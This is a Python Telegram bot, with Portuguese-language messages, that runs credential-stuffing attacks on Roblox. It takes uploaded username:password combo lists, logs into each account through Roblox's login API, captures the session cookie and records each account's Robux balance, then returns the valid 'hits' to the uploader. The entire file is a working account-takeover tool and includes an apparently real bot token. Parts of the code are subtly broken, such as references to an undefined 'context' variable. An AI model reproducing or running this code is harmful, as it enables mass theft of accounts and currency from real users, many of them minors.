#!/usr/bin/env python3
import os, asyncio, logging, datetime, re
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from aiofiles import open as aopen
import aiohttp, csv

# ---------- CONFIG ----------
TOKEN = "7356891537:AAHHYDE9qFSoHIkLFaNAX2UJzMcOa0u_qcE"
ADMIN_ID = 7898948145          # id do admin
WORKERS = 200
TIMEOUT = 8
# ---------------------------

logging.basicConfig(format="%(asctime)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

QUEUE_HITS  = asyncio.Queue()
QUEUE_ROBUX = asyncio.Queue()
STATS = {"total":0, "hit":0, "robux":0, "start":None}

# ---------- CHECKER ----------
HEADERS = {"User-Agent": "Roblox/WinInet", "Content-Type": "application/json;charset=utf-8"}

async def auth_cookie(session, user, pwd):
    payload = {"ctype": "Username", "cvalue": user, "password": pwd}
    async with session.post("https://auth.roblox.com/v2/login", json=payload, headers=HEADERS) as r:
        if "x-csrf-token" in r.headers:
            HEADERS["X-Csrf-Token"] = r.headers["x-csrf-token"]
        if r.status == 200:
            return r.cookies.get(".ROBLOSECURITY").value
    return None

async def user_info(session, cookie):
    url = "https://users.roblox.com/v1/users/authenticated"
    async with session.get(url, headers={**HEADERS, "Cookie": f".ROBLOSECURITY={cookie}"}) as r:
        if r.status == 200:
            data = await r.json()
            return data["id"], data["name"]
    return None, None

async def robux_amount(session, user_id, cookie):
    url = f"https://economy.roblox.com/v1/users/{user_id}/currency"
    async with session.get(url, headers={**HEADERS, "Cookie": f".ROBLOSECURITY={cookie}"}) as r:
        if r.status == 200:
            return (await r.json()).get("robux", 0)
    return 0

async def check_one(session, combo: str):
    user, pwd = combo.strip().split(":", 1)
    try:
        cookie = await auth_cookie(session, user, pwd)
        if not cookie: return
        uid, name = await user_info(session, cookie)
        if not uid: return
        rbx = await robux_amount(session, uid, cookie)
        await QUEUE_ROBUX.put(f"{user}:{pwd}|{uid}|{name}|{rbx}R$")
        await QUEUE_HITS.put(f"[HIT] {user}:{pwd}")
    except Exception:
        pass

async def engine_check(path):
    conn = aiohttp.TCPConnector(limit=0, ssl=False)
    timeout = aiohttp.ClientTimeout(total=TIMEOUT+2)
    async with aiohttp.ClientSession(connector=conn, timeout=timeout) as s:
        with open(path) as f:
            combos = [l for l in f if ":" in l]
        tasks = [asyncio.create_task(check_one(s, c)) for c in combos]
        for i in range(0, len(tasks), WORKERS):
            await asyncio.gather(*tasks[i:i+WORKERS], return_exceptions=True)

# ---------- TELEGRAM ----------
async def start(update: Update, _):
    await update.message.reply_text("🤖 Roblox Full-Checker\nEnvie .txt user:pass (legenda 'robux' para captura de saldo).")

async def stats(update: Update, _):
    if update.effective_user.id != ADMIN_ID: return
    await update.message.reply_text(
        f"📊 Hits: {STATS['hit']}  |  Robux capturas: {STATS['robux']}")

async def handle_doc(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc = update.message.document
    if not doc.file_name.endswith(".txt"): return
    path = f"combo/{update.effective_user.id}_{int(datetime.datetime.now().timestamp())}.txt"
    await doc.get_file().download_to_drive(path)
    captura_robux = bool(update.message.caption and re.search(r"(?i)robux", update.message.caption))
    await update.message.reply_text("🔍 Trabalhando…")
    if captura_robux:
        asyncio.create_task(run_robux(path, update.effective_chat.id))
    else:
        asyncio.create_task(run_simple(path, update.effective_chat.id))

async def run_simple(path, chat_id):
    await engine_check(path)
    out = f"hits/hits_{os.path.basename(path)}"
    async with aopen(out,"w") as f:
        while not QUEUE_HITS.empty():
            await f.write((await QUEUE_HITS.get())+"\n")
    await context.bot.send_document(chat_id, open(out,"rb"), caption="✅ Check finalizado")
    os.remove(out)

async def run_robux(path, chat_id):
    await engine_check(path)
    out = f"hits/robux_{os.path.basename(path)}"
    async with aopen(out,"w") as f:
        while not QUEUE_ROBUX.empty():
            line = await QUEUE_ROBUX.get()
            await f.write(line+"\n")
            STATS["robux"] += 1
    await context.bot.send_document(chat_id, open(out,"rb"), caption="✅ Captura Robux pronta")
    os.remove(out)

def main():
    os.makedirs("combo", exist_ok=True)
    os.makedirs("hits", exist_ok=True)
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stats", stats))
    app.add_handler(MessageHandler(filters.Document.TXT, handle_doc))
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
